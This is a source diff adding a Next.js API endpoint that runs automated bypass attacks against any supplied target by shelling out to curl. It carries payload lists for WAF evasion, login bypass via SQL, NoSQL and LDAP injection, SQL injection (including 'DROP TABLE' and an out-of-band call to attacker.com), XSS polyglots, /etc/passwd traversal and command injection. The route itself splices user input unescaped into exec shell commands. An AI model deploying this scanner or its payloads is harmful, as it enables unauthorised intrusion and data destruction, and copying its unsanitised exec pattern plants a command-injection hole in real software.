@@ -1,0 +1,496 @@
+// API: Bypass Tests - Test all bypass techniques
+// POST /api/osint/bypass-tests - Execute real bypass attempts
+
+import { NextRequest, NextResponse } from 'next/server';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+
+const execAsync = promisify(exec);
+
+export async function POST(request: NextRequest) {
+  try {
+    const { target, test_type } = await request.json();
+
+    const results: any = {
+      timestamp: new Date().toISOString(),
+      target,
+      test_type: test_type || 'all',
+      bypasses_found: [],
+      successful_bypasses: 0,
+      failed_bypasses: 0,
+      critical_findings: 0
+    };
+
+    // Run all bypass tests
+    if (test_type === 'all' || test_type === 'waf') {
+      const wafResults = await testWAFBypass(target);
+      results.bypasses_found.push(...wafResults);
+    }
+
+    if (test_type === 'all' || test_type === 'auth') {
+      const authResults = await testAuthBypass(target);
+      results.bypasses_found.push(...authResults);
+    }
+
+    if (test_type === 'all' || test_type === 'filter') {
+      const filterResults = await testFilterBypass(target);
+      results.bypasses_found.push(...filterResults);
+    }
+
+    if (test_type === 'all' || test_type === 'encoding') {
+      const encodingResults = await testEncodingBypass(target);
+      results.bypasses_found.push(...encodingResults);
+    }
+
+    if (test_type === 'all' || test_type === 'sql') {
+      const sqlResults = await testSQLBypass(target);
+      results.bypasses_found.push(...sqlResults);
+    }
+
+    if (test_type === 'all' || test_type === 'xss') {
+      const xssResults = await testXSSBypass(target);
+      results.bypasses_found.push(...xssResults);
+    }
+
+    if (test_type === 'all' || test_type === 'path') {
+      const pathResults = await testPathBypass(target);
+      results.bypasses_found.push(...pathResults);
+    }
+
+    if (test_type === 'all' || test_type === 'rce') {
+      const rceResults = await testRCEBypass(target);
+      results.bypasses_found.push(...rceResults);
+    }
+
+    // Calculate stats
+    results.successful_bypasses = results.bypasses_found.filter((b: any) => b.success).length;
+    results.failed_bypasses = results.bypasses_found.filter((b: any) => !b.success).length;
+    results.critical_findings = results.bypasses_found.filter((b: any) => b.success && b.severity === 'CRITICAL').length;
+
+    return NextResponse.json({
+      success: true,
+      results
+    });
+
+  } catch (error: any) {
+    return NextResponse.json(
+      { success: false, error: error.message },
+      { status: 500 }
+    );
+  }
+}
+
+// 1. WAF Bypass Tests
+async function testWAFBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'Case Variation', payload: 'SeLeCt * FrOm users', param: 'id' },
+    { name: 'Comment Injection', payload: "1' OR /**/1=1--", param: 'id' },
+    { name: 'Whitespace Variation', payload: "1'%09OR%091=1--", param: 'id' },
+    { name: 'Encoding (URL)', payload: "%31%27%20%4f%52%20%31%3d%31%2d%2d", param: 'id' },
+    { name: 'Encoding (Unicode)', payload: "1\\u0027 OR 1=1--", param: 'id' },
+    { name: 'NULL Byte', payload: "1' OR 1=1%00--", param: 'id' },
+    { name: 'Concatenation', payload: "1' OR 'a'='a'--", param: 'id' },
+    { name: 'HTTP Parameter Pollution', payload: "id=1&id=' OR 1=1--", param: 'id' },
+    { name: 'Header Injection', payload: "X-Forwarded-For: 127.0.0.1", param: 'header' },
+    { name: 'Method Override', payload: "X-HTTP-Method-Override: DELETE", param: 'header' }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      let cmd = '';
+      if (technique.param === 'header') {
+        cmd = `curl -s -H "${technique.payload}" "http://${target}/" --max-time 3`;
+      } else {
+        cmd = `curl -s "http://${target}/?${technique.param}=${encodeURIComponent(technique.payload)}" --max-time 3`;
+      }
+
+      const { stdout, stderr } = await execAsync(cmd, { timeout: 4000 });
+
+      const success = !stdout.includes('blocked') &&
+                     !stdout.includes('forbidden') &&
+                     !stdout.includes('WAF') &&
+                     !stderr.includes('error');
+
+      bypasses.push({
+        category: 'WAF Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: success,
+        severity: success ? 'HIGH' : 'INFO',
+        response_length: stdout.length,
+        details: success ? 'WAF potentially bypassed' : 'Blocked by WAF'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'WAF Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed or timeout'
+      });
+    }
+  }
+
+  return bypasses;
+}
+
+// 2. Authentication Bypass Tests
+async function testAuthBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'SQL Auth Bypass', username: "admin' OR '1'='1", password: "anything" },
+    { name: 'SQL Auth Bypass (comment)', username: "admin'--", password: "" },
+    { name: 'NoSQL Injection', username: '{"$gt":""}', password: '{"$gt":""}' },
+    { name: 'LDAP Injection', username: "*)(uid=*))(|(uid=*", password: "anything" },
+    { name: 'JWT None Algorithm', username: "admin", password: "test", jwt: true },
+    { name: 'Session Fixation', username: "admin", password: "test", session: "FIXED123" },
+    { name: 'Password Reset Bypass', username: "admin", password: "", reset: true },
+    { name: 'Username Enumeration', username: "admin", password: "", enum: true }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      const data = JSON.stringify({
+        username: technique.username,
+        password: technique.password
+      });
+
+      const { stdout } = await execAsync(
+        `curl -s -X POST "http://${target}/login" -H "Content-Type: application/json" -d '${data}' --max-time 3`,
+        { timeout: 4000 }
+      );
+
+      const success = stdout.includes('success') ||
+                     stdout.includes('dashboard') ||
+                     stdout.includes('token') ||
+                     (!stdout.includes('invalid') && !stdout.includes('incorrect'));
+
+      bypasses.push({
+        category: 'Authentication Bypass',
+        technique: technique.name,
+        payload: `${technique.username} / ${technique.password}`,
+        success: success,
+        severity: success ? 'CRITICAL' : 'INFO',
+        details: success ? 'Authentication bypassed' : 'Authentication required'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'Authentication Bypass',
+        technique: technique.name,
+        payload: `${technique.username} / ${technique.password}`,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed'
+      });
+    }
+  }
+
+  return bypasses;
+}
+
+// 3. Filter Bypass Tests
+async function testFilterBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'Keyword Blacklist (union)', payload: "1' UnIoN SeLeCt 1,2--" },
+    { name: 'Keyword Blacklist (select)', payload: "1' /*!50000SeLeCt*/ 1,2--" },
+    { name: 'Keyword Blacklist (or)', payload: "1' || 1=1--" },
+    { name: 'Keyword Blacklist (and)', payload: "1' && 1=1--" },
+    { name: 'Comment Bypass', payload: "1'/**/OR/**/1=1--" },
+    { name: 'Double Encoding', payload: "%2527%20OR%201=1--" },
+    { name: 'Hex Encoding', payload: "0x61646d696e" },
+    { name: 'Char Function', payload: "CHAR(97,100,109,105,110)" }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      const { stdout } = await execAsync(
+        `curl -s "http://${target}/?id=${encodeURIComponent(technique.payload)}" --max-time 3`,
+        { timeout: 4000 }
+      );
+
+      const success = !stdout.includes('filtered') &&
+                     !stdout.includes('blocked') &&
+                     stdout.length > 100;
+
+      bypasses.push({
+        category: 'Filter Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: success,
+        severity: success ? 'HIGH' : 'INFO',
+        details: success ? 'Filter bypassed' : 'Request filtered'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'Filter Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed'
+      });
+    }
+  }
+
+  return bypasses;
+}
+
+// 4. Encoding Bypass Tests
+async function testEncodingBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'URL Encoding', payload: "%3Cscript%3Ealert(1)%3C%2Fscript%3E" },
+    { name: 'Double URL Encoding', payload: "%253Cscript%253Ealert(1)%253C%252Fscript%253E" },
+    { name: 'Unicode Encoding', payload: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e" },
+    { name: 'HTML Entity', payload: "&lt;script&gt;alert(1)&lt;/script&gt;" },
+    { name: 'Base64', payload: "PGJhc2U2ND5hbGVydCgxKTwvYmFzZTY0Pg==" },
+    { name: 'Hex Encoding', payload: "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;" },
+    { name: 'UTF-7', payload: "+ADw-script+AD4-alert(1)+ADw-/script+AD4-" },
+    { name: 'Mixed Case', payload: "<ScRiPt>alert(1)</sCrIpT>" }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      const { stdout } = await execAsync(
+        `curl -s "http://${target}/?test=${technique.payload}" --max-time 3`,
+        { timeout: 4000 }
+      );
+
+      const success = stdout.includes('<script>') ||
+                     stdout.includes('alert') ||
+                     stdout.includes(technique.payload);
+
+      bypasses.push({
+        category: 'Encoding Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: success,
+        severity: success ? 'HIGH' : 'INFO',
+        details: success ? 'Encoding bypass successful' : 'Payload not reflected'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'Encoding Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed'
+      });
+    }
+  }
+
+  return bypasses;
+}
+
+// 5. SQL Injection Bypass Tests
+async function testSQLBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'Time-based Blind', payload: "1' AND SLEEP(5)--" },
+    { name: 'Boolean-based Blind', payload: "1' AND 1=1--" },
+    { name: 'Union-based', payload: "1' UNION SELECT NULL,NULL--" },
+    { name: 'Error-based', payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--" },
+    { name: 'Stacked Queries', payload: "1'; DROP TABLE test--" },
+    { name: 'Out-of-band', payload: "1' AND LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.attacker.com\\\\a'))--" },
+    { name: 'Second Order', payload: "admin' OR '1'='1" },
+    { name: 'Routed Injection', payload: "1' AND extractvalue(1,concat(0x7e,database()))--" }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      const start = Date.now();
+      const { stdout } = await execAsync(
+        `curl -s "http://${target}/?id=${encodeURIComponent(technique.payload)}" --max-time 8`,
+        { timeout: 9000 }
+      );
+      const elapsed = Date.now() - start;
+
+      const success = (technique.name.includes('Time-based') && elapsed > 4500) ||
+                     stdout.includes('error') ||
+                     stdout.includes('SQL') ||
+                     stdout.includes('mysql') ||
+                     stdout.length > 1000;
+
+      bypasses.push({
+        category: 'SQL Injection Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: success,
+        severity: success ? 'CRITICAL' : 'INFO',
+        response_time: elapsed,
+        details: success ? 'SQL injection successful' : 'No SQL injection detected'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'SQL Injection Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed or timeout'
+      });
+    }
+  }
+
+  return bypasses;
+}
+
+// 6. XSS Bypass Tests
+async function testXSSBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'Basic XSS', payload: '<script>alert(1)</script>' },
+    { name: 'Event Handler', payload: '<img src=x onerror=alert(1)>' },
+    { name: 'SVG XSS', payload: '<svg/onload=alert(1)>' },
+    { name: 'Polyglot', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//' },
+    { name: 'Filter Evasion', payload: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
+    { name: 'Unicode', payload: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e' },
+    { name: 'Data URI', payload: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>' },
+    { name: 'Mutation XSS', payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">' }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      const { stdout } = await execAsync(
+        `curl -s "http://${target}/?q=${encodeURIComponent(technique.payload)}" --max-time 3`,
+        { timeout: 4000 }
+      );
+
+      const success = stdout.includes('<script>') ||
+                     stdout.includes('onerror=') ||
+                     stdout.includes('onload=') ||
+                     stdout.includes(technique.payload);
+
+      bypasses.push({
+        category: 'XSS Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: success,
+        severity: success ? 'HIGH' : 'INFO',
+        details: success ? 'XSS payload reflected' : 'XSS payload filtered'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'XSS Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed'
+      });
+    }
+  }
+
+  return bypasses;
+}
+
+// 7. Path Traversal Bypass Tests
+async function testPathBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'Basic Traversal', payload: '../../etc/passwd' },
+    { name: 'URL Encoded', payload: '..%2F..%2Fetc%2Fpasswd' },
+    { name: 'Double URL Encoded', payload: '..%252F..%252Fetc%252Fpasswd' },
+    { name: 'Unicode', payload: '..\\u002F..\\u002Fetc\\u002Fpasswd' },
+    { name: '16-bit Unicode', payload: '..%u002F..%u002Fetc%u002Fpasswd' },
+    { name: 'Dot Bypass', payload: '....//....//etc/passwd' },
+    { name: 'Backslash', payload: '..\\..\\etc\\passwd' },
+    { name: 'Null Byte', payload: '../../etc/passwd%00' },
+    { name: 'Absolute Path', payload: '/etc/passwd' },
+    { name: 'Windows', payload: '..\\..\\windows\\system32\\drivers\\etc\\hosts' }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      const { stdout } = await execAsync(
+        `curl -s "http://${target}/?file=${encodeURIComponent(technique.payload)}" --max-time 3`,
+        { timeout: 4000 }
+      );
+
+      const success = stdout.includes('root:x:0:0') ||
+                     stdout.includes('/bin/bash') ||
+                     stdout.includes('# localhost') ||
+                     stdout.includes('[boot loader]');
+
+      bypasses.push({
+        category: 'Path Traversal Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: success,
+        severity: success ? 'CRITICAL' : 'INFO',
+        details: success ? 'File disclosure successful' : 'Path blocked or file not found'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'Path Traversal Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed'
+      });
+    }
+  }
+
+  return bypasses;
+}
+
+// 8. RCE Bypass Tests
+async function testRCEBypass(target: string): Promise<any[]> {
+  const bypasses: any[] = [];
+
+  const techniques = [
+    { name: 'Command Injection', payload: '; whoami' },
+    { name: 'Pipe Injection', payload: '| whoami' },
+    { name: 'Backtick', payload: '`whoami`' },
+    { name: 'Dollar Sign', payload: '$(whoami)' },
+    { name: 'Semicolon', payload: '; id' },
+    { name: 'AND Operator', payload: '&& whoami' },
+    { name: 'OR Operator', payload: '|| whoami' },
+    { name: 'Newline', payload: '%0awhoami' },
+    { name: 'Null Byte', payload: '%00whoami' },
+    { name: 'Variable Expansion', payload: '${PATH:0:1}bin${PATH:0:1}whoami' }
+  ];
+
+  for (const technique of techniques) {
+    try {
+      const { stdout } = await execAsync(
+        `curl -s "http://${target}/?cmd=ping%20127.0.0.1${encodeURIComponent(technique.payload)}" --max-time 3`,
+        { timeout: 4000 }
+      );
+
+      const success = stdout.match(/root|bin|usr|uid=|gid=|www-data|apache|nginx/);
+
+      bypasses.push({
+        category: 'RCE Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: !!success,
+        severity: success ? 'CRITICAL' : 'INFO',
+        details: success ? 'Command execution successful' : 'Command blocked or failed'
+      });
+    } catch (e) {
+      bypasses.push({
+        category: 'RCE Bypass',
+        technique: technique.name,
+        payload: technique.payload,
+        success: false,
+        severity: 'INFO',
+        details: 'Request failed'
+      });
+    }
+  }
+
+  return bypasses;
+}
